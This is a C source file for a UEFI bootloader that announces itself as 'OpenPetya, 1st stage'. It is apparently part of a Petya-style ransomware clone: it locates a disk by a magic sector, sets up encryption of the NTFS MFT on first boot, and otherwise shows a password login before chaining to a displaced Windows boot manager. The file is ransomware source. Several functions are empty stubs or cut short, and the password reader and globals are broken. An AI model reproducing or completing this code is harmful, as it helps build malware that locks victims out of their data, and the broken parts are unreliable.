// bootloader.c

#include <efi.h>
#include <efilib.h>

#include "ntfs.h"
#include "ntfs_crypt.h"
#include "state.h"
#include "hidden_store.h"
#include "password_store.h"

#include "config.h"

static EFI_SYSTEM_TABLE *gST = NULL;
static EFI_BOOT_SERVICES *gBS = NULL;
static EFI_BLOCK_IO *gDisk = NULL;
static UINT32 gMediaId = 0;

static void do_halt(void)
{
    for (;;)
        gBS->Stall(1000000);
}

static void uefi_print(const char *s)
{
    while (*s)
    {
        CHAR16 buffer[2] = { (CHAR16)*s, 0 };
        gST->ConOut->OutputString(gST->ConOut, buffer);
        s++;
    }
}

static void uefi_reboot(void)
{
    gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
    for (;;);
}

static void uefi_sleep_ms(UINTN ms)
{
    gBS->Stall(ms * 1000); // Stall takes microseconds
}

static void uefi_clear(void)
{
    gST->ConOut->ClearScreen(gST->ConOut);
}

static void uefi_set_color(UINTN fg, UINTN bg)
{
    gST->ConOut->SetAttribute(gST->ConOut, EFI_TEXT_ATTR(fg, bg));
}

static int uefi_read_sector(UINT32 lba, void *buffer)
{
    EFI_STATUS status = gDisk->ReadBlocks(gDisk, gMediaId, (EFI_LBA)lba, 512, buffer);
    return EFI_ERROR(status) ? -1 : 0;
}

static int uefi_write_sector(UINT32 lba, const void *buffer)
{
    EFI_STATUS status = gDisk->WriteBlocks(gDisk, gMediaId, (EFI_LBA)lba, 512, (void *)buffer);
    return EFI_ERROR(status) ? -1 : 0;
}

static UINT32 uefi_find_ntfs_lba(void)
{
    UINT8 mbr[512];
    UINT32 best_lba = 0;
    UINT32 best_size = 0;



    return best_lba;
}

static void uefi_read_password(char *buffer, int max_len)
{
    int i = 0;
    while (i < max_len - 1)
    {
        // Wait for a key
        gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, NULL);

        EFI_INPUT_KEY key;
        EFI_STATUS status = gST->ConIn->ReadKeyStroke(gST->ConIn, &key);
        if (EFI_ERROR(status))
            continue;

        if (key.UnicodeChar == L'\r' || key.UnicodeChar == L'\n')
        {
            uefi_print("\n");
            break;
        }

        if (key.UnicodeChar == L'\b' && i > 0)
        {
            uefi_print("\b \b");
            i--;

            break;
        }

        if (key.UnicodeChar < 32 || key.UnicodeChar > 126)
            continue;

        uefi_print("*");
    }

    buffer[i] = '\0';
}

void zero_buffer(char *buffer, int len)
{
    for (int i = 0; i < len; i++)
        buffer[i] = 0;
}

/// @brief Encrypt MFT
/// @param systab 
void do_encryption(void)
{
    UINT64 disk_size;
    UINT32 partition_lba;
    char password[65];

    uefi_clear();
    uefi_set_color(EFI_WHITE, EFI_BLUE);
    uefi_print("OpenPetya, 1st stage.\n\n");
    uefi_set_color(EFI_WHITE, EFI_BLACK);

    uefi_set_color(EFI_YELLOW, EFI_BLACK);
    uefi_print("First boot detected. Setting up encryption...\n");
    uefi_set_color(EFI_WHITE, EFI_BLACK);

    disk_size = state_read_disk_size();
    if (disk_size == 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: Disk size not set by installer.\n");

        do_halt();
    }

    uefi_print("Detecting NTFS partition...\n");
    partition_lba = uefi_find_ntfs_lba();
    if (partition_lba == 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: No NTFS partition found!\n");

        do_halt();
    }

    hidden_store_init(disk_size);


}

/// @brief Login panel
/// @param systab 
void do_login(void)
{
    UINT32 partition_lba;
    
}

/// @brief main function
/// @param image 
/// @param systab 
/// @return 
EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    EFI_STATUS status;

    gST = systab;
    gBS = systab->BootServices;
    gRT = systab->RuntimeServices;

    InitializeLib(image, systab);

    UINTN handle_count = 0;
    EFI_HANDLE *handles = NULL;
    EFI_GUID bio_guid = EFI_BLOCK_IO_PROTOCOL_GUID;

    status = gBS->LocateHandleBuffer(ByProtocol, &bio_guid, NULL, &handle_count, &handles);

    if (EFI_ERROR(status))
    {
        uefi_print("Cannot locate block devices!\n");
        return status;
    }

    for (UINTN i = 0; i < handle_count; i++)
    {
        EFI_BLOCK_IO *bio = NULL;
        status = gBS->HandleProtocol(handles[i], &bio_guid, (void **)&bio);
        if (EFI_ERROR(status))
            continue;
        if (!bio->Media->MediaPresent)
            continue;
        if (bio->Media->LogicalPartition)
            continue;

        // try to read sector 60 to find the magic value.
        UINT8 sector[512] = { 0 };
        bio->ReadBlocks(bio, bio->Media->MediaId, STATE_SECTOR, 512, sector);
        UINT32 magic = *(UINT32 *)sector;
        if (magic == STATE_MAGIC)
        {
            // found the disk
            gDisk = bio;
            gMediaId = bio->Media->MediaId;
            break;
        }
    }

    gBS->FreePool(handles);
    if (!gDisk)
    {
        uefi_print("Cannot find the disk! (no state sector magic)\n");
        gBS->Stall(5000000);
        return EFI_NOT_FOUND;
    }

    // read disk and branch
    UINT8 state_raw[512];
    uefi_read_sector(STATE_SECTOR, state_raw);
    UINT8 state = state_raw[4];

    if (state == 0x00)
        do_encryption();
    else
        do_login();

    // After login() returns successfully, launch original bootmgfw.efi
    // Load bootmgfw_original.efi from ESP
    EFI_GUID lip_guid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
    EFI_GUID sfsp_guid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;

    CHAR16 *original_path = L"\\EFI\\Microsoft\\Boot\\bootmgfw.original.efi";

    EFI_DEVICE_PATH *dp = FileDevicePath(NULL, original_path);
    EFI_HANDLE new_image = NULL;

    status = gBS->LoadImage(FALSE, image, dp, NULL, 0, &new_image);
    if (EFI_ERROR(status))
    {
        uefi_print("Cannot load bootmgfw_original.efi!\n");
        gBS->Stall(5000000);

        return status;
    }

    status = gBS->StartImage(new_image, NULL, NULL);

    return status;

    // EFI_INPUT_KEY key;
    // Print(L"Press any key to continue...\n");
    // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
    // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);

    // return EFI_SUCCESS;
}